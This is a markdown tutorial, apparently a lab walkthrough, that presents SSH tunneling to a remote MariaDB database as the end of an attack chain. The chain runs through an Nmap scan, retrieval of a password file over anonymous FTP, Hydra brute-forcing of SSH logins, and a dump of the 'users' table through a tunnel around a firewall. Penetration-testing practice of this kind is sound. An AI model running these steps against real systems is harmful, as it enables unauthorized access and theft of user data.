# SSH Tunneling for Connecting to a MariaDB Database from a Local Machine

This tutorial demonstrates how to connect to a MariaDB database on a remote Debian server from a local Parrot OS machine using SSH tunneling. The scenario involves discovering SSH credentials via an FTP service, brute-forcing SSH login using Hydra, and then using those credentials to establish an SSH tunnel.

## Prerequisites

- Two machines:
  - Debian server with FTP, SSH, and MariaDB services.
  - Parrot OS machine (attacker's machine).
- Nmap installed on Parrot OS.
- FTP client installed on Parrot OS.
- SSH client installed on Parrot OS.
- MariaDB client installed on Parrot OS.
- Hydra installed on Parrot OS.

## Steps

### 1. Scan the Server with Nmap

First, identify the open ports on the Debian server using Nmap.

```bash
nmap -sS -p- [Debian_Server_IP]
```

Analyze the output to find open ports for FTP (21), SSH (22), and MariaDB (3306).

### 2. Access the FTP Service

Connect to the FTP service to explore its contents.

```bash
ftp [Debian_Server_IP]
```

Log in with anonymous credentials or a known user. List the files and look for any files that might contain useful information.

```ftp
ls
get common_passwords.txt
bye
```

### 3. Discover SSH Credentials

After downloading `common_passwords.txt`, inspect it for possible SSH passwords.

```bash
cat common_passwords.txt
```

### 4. Brute-force SSH Login with Hydra

Use Hydra to attempt logging in to SSH with a list of users and the common passwords found.

```bash
hydra -L users.txt -P common_passwords.txt ssh://[Debian_Server_IP]
```

Analyze Hydra's output to find a valid username and password.

### 5. Attempt SSH Login with Discovered Credentials

Try to log in using SSH with the discovered credentials.

```bash
ssh [username]@[Debian_Server_IP]
```

### 6. List Server Sockets

Once logged in, list the server's active network connections and listening sockets to verify the MariaDB service.

```bash
ss -tulpn
```

Look for the entry corresponding to MariaDB (port 3306) and verify that it is listening but blocked to external connections (likely due to UFW).

### 7. Create an SSH Tunnel

Create an SSH tunnel to forward a local port (1234) to the remote MariaDB port (3306).

```bash
ssh -L 1234:localhost:3306 [username]@[Debian_Server_IP]
```

### 8. Install MariaDB Client on Parrot OS

If the MariaDB client is not already installed on your Parrot OS machine, install it using the package manager.

```bash
sudo apt-get update
sudo apt-get install mariadb-client
```

### 9. Connect to the MariaDB Database

Use the MariaDB client to connect to the database through the SSH tunnel.

```bash
mysql -u [db_user] -p -h 127.0.0.1 -P 1234
```

Enter the database password when prompted.

### 10. List Databases

After connecting, list all databases.

```sql
SHOW DATABASES;
```

### 11. Connect to the `api` Database

Connect to the `api` database.

```sql
USE api;
```

### 12. List Users from the `users` Table

List all users from the `users` table.

```sql
SELECT * FROM users;
```

## Summary

You have successfully established an SSH tunnel from your local Parrot OS machine to a remote MariaDB database on a Debian server. You discovered SSH credentials via the FTP service, used Hydra to brute-force the SSH login, created the tunnel, and accessed the database using the MariaDB client.

---

Ensure you have proper authorization to access and interact with the systems described in this tutorial. Unauthorized access is illegal and unethical.